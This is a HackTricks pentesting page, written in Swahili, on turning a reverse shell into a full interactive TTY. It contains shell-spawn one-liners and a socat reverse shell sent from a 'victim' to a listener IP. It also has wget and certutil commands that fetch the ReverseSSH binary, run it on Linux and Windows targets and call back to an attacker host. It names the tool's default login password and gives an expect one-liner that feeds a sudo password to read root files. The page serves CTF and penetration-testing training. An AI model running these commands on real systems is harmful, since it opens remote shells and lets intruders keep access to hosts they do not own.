# TTY Kamili

{{#include ../../banners/hacktricks-training.md}}

## TTY Kamili

Kumbuka kwamba shell unayoweka katika variable ya `SHELL` **lazima** iwe **imeorodheshwa ndani ya** _**/etc/shells**_ au `The value for the SHELL variable was not found in the /etc/shells file This incident has been reported`. Pia, kumbuka kwamba snippets zifuatazo hufanya kazi kwenye bash pekee. Ikiwa uko kwenye zsh, badilisha kwenda bash kabla ya kupata shell kwa kuendesha `bash`.

#### Python
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'

(inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
```
> [!TIP]
> Unaweza kupata **idadi** ya **safu** na **nguzo** kwa kutekeleza **`stty -a`**

#### script
```bash
script /dev/null -qc /bin/bash #/dev/null is to not store anything
(inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
```
#### socat
```bash
#Listener:
socat file:`tty`,raw,echo=0 tcp-listen:4444

#Victim:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
```
### **Spawn shells**

- `python -c 'import pty; pty.spawn("/bin/sh")'`
- `echo os.system('/bin/bash')`
- `/bin/sh -i`
- `script -qc /bin/bash /dev/null`
- `perl -e 'exec "/bin/sh";'`
- perl: `exec "/bin/sh";`
- ruby: `exec "/bin/sh"`
- lua: `os.execute('/bin/sh')`
- IRB: `exec "/bin/sh"`
- vi: `:!bash`
- vi: `:set shell=/bin/bash:shell`
- nmap: `!sh`

## ReverseSSH

Njia rahisi ya kupata **interactive shell access**, pamoja na **file transfers** na **port forwarding**, ni kuweka ssh server iliyounganishwa statically [ReverseSSH](https://github.com/Fahrj/reverse-ssh) kwenye target.<sup>[[1]](#references)</sup>

Hapa chini kuna mfano wa `x86` wenye binaries zilizobanwa kwa upx. Kwa binaries nyingine, angalia [releases page](https://github.com/Fahrj/reverse-ssh/releases/latest/).

1. Jiandae locally ili kupokea ombi la ssh port forwarding:
```bash
# Drop it via your preferred way, e.g.
wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86 -O /dev/shm/reverse-ssh && chmod +x /dev/shm/reverse-ssh

/dev/shm/reverse-ssh -v -l -p 4444
```
- (2a) Linux inayolengwa:
```bash
# Drop it via your preferred way, e.g.
wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86 -O /dev/shm/reverse-ssh && chmod +x /dev/shm/reverse-ssh

/dev/shm/reverse-ssh -p 4444 kali@10.0.0.2
```
- (2b) Windows 10 target (kwa matoleo ya awali, angalia [project readme](https://github.com/Fahrj/reverse-ssh#features)):
```bash
# Drop it via your preferred way, e.g.
certutil.exe -f -urlcache https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86.exe reverse-ssh.exe

reverse-ssh.exe -p 4444 kali@10.0.0.2
```
- Ikiwa ombi la port forwarding la ReverseSSH lilifanikiwa, sasa unapaswa kuweza kuingia ukitumia password chaguo-msingi `letmeinbrudipls` katika muktadha wa user anayeendesha `reverse-ssh(.exe)`:
```bash
# Interactive shell access
ssh -p 8888 127.0.0.1

# Bidirectional file transfer
sftp -P 8888 127.0.0.1
```
## Penelope

[Penelope](https://github.com/brightio/penelope) huboresha kiotomatiki Linux reverse shells kuwa TTY, hushughulikia ukubwa wa terminal, huhifadhi kila kitu kwenye log na mengine mengi. Pia hutoa readline support kwa Windows shells.<sup>[[2]](#references)</sup>

![penelope](https://github.com/user-attachments/assets/27ab4b3a-780c-4c07-a855-fd80a194c01e)

## Bila TTY

Ikiwa kwa sababu fulani huwezi kupata full TTY, **bado unaweza kuingiliana na programu** zinazotarajia input ya mtumiaji. Katika mfano ufuatao, password inapitishwa kwa `sudo` ili kusoma file:
```bash
expect -c 'spawn sudo -S cat "/root/root.txt";expect "*password*";send "<THE_PASSWORD_OF_THE_USER>";send "\r\n";interact'
```
## Marejeo

- [1] [ReverseSSH - Statically-linked ssh server with reverse shell functionality for CTFs and such](https://github.com/Fahrj/reverse-ssh)
- [2] [Penelope - Shell handler that automates a few things to make life easier](https://github.com/brightio/penelope)

{{#include ../../banners/hacktricks-training.md}}
